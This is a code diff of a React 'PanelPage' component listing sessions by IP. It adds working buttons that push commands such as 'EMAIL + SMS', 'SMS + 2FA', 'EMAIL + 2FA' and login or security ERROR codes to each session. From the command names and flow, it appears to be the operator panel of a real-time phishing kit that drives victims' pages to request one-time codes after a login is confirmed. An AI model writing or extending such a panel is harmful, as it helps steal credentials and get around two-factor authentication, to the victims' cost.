@@ -283,32 +283,6 @@ export default function PanelPage() {
                           </p>
                         </td> */}
                         <td className="px-6 py-4 flex flex-row gap-2 font-medium text-base text-white text-center">
-                          {data.command === "W_LOGIN_CONFIRM" ? (
-                            <>
-                              <button
-                                onClick={() =>
-                                  handleCommand("W_LOGIN_ERROR", ip, id)
-                                }
-                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
-                              >
-                                ERROR
-                              </button>
-                            </>
-                          ) : data.command.includes("W_SEC") &&
-                            data.command.includes("CONFIRM") ? (
-                            <>
-                              <button
-                                onClick={() => {
-                                  const ref = data.command.split("_")[2];
-                                  const code = `W_SEC_${ref}_ERROR`;
-                                  handleCommand(code, ip, id);
-                                }}
-                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
-                              >
-                                ERROR
-                              </button>
-                            </>
-                          ) : null}
                           {data.command.includes("CONFIRM") ? (
                             <>
                               <div className="w-full justify-center text-center grid grid-cols-2 gap-2  items-center">
@@ -340,53 +314,55 @@ export default function PanelPage() {
                                 </button>
 
                                 <button
-                                  // onClick={() =>
-                                  //   handleCommand("W_WITH_23", key)
-                                  // }
+                                  onClick={() =>
+                                    handleCommand("W_WITH_23", ip, key)
+                                  }
                                   className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                 >
                                   EMAIL + SMS
                                 </button>
 
                                 <button
-                                  // onClick={() =>
-                                  //   handleCommand("W_WITH_13", key)
-                                  // }
+                                  onClick={() =>
+                                    handleCommand("W_WITH_13", ip, key)
+                                  }
                                   className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                 >
                                   SMS + 2FA
                                 </button>
                                 <button
-                                  // onClick={() =>
-                                  //   handleCommand("W_WITH_12", key)
-                                  // }
+                                  onClick={() =>
+                                    handleCommand("W_WITH_12", ip, key)
+                                  }
                                   className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                 >
                                   EMAIL + 2FA
                                 </button>
 
                                 <button
-                                  // onClick={() =>
-                                  //   handleCommand("W_WITH_123", key)
-                                  // }
+                                  onClick={() =>
+                                    handleCommand("W_WITH_123", ip, key)
+                                  }
                                   className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                 >
                                   AMBOS
                                 </button>
                                 <button
-                                  // onClick={() => {
-                                  //   if (data.command.includes("CONFIRM")) {
-                                  //     handleCommand(
-                                  //       data.command.replace(
-                                  //         "CONFIRM",
-                                  //         "ERROR"
-                                  //       ),
-                                  //       key
-                                  //     );
-                                  //   } else {
-                                  //     handleCommand("W_SEC_ERROR_", key);
-                                  //   }
-                                  // }}
+                                  onClick={() => {
+                                    if (
+                                      data.command.includes("CONFIRM") &&
+                                      data.command!
+                                    ) {
+                                      handleCommand(
+                                        data.command.replace(
+                                          "CONFIRM",
+                                          "ERROR"
+                                        ),
+                                        ip,
+                                        key
+                                      );
+                                    }
+                                  }}
                                   className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                 >
                                   ERROR
